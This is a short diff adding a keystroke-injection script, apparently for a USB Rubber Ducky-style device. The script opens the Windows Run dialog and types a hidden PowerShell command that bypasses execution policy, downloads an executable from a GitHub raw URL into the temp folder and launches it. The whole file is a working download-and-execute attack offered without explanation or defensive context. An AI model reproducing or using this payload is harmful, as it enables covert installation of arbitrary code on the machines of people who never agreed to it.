@@ -1,0 +1,5 @@
+DELAY 1000
+GUI r
+DELAY 600
+STRING powershell -ep bypass -w h -c "$url='https://github.com/EEmeka33/CyberDuck/raw/refs/heads/main/dist/duck.exe';$out=$env:TEMP+'\cg.exe';iwr $url -o $out;Start-Process $out"
+ENTER
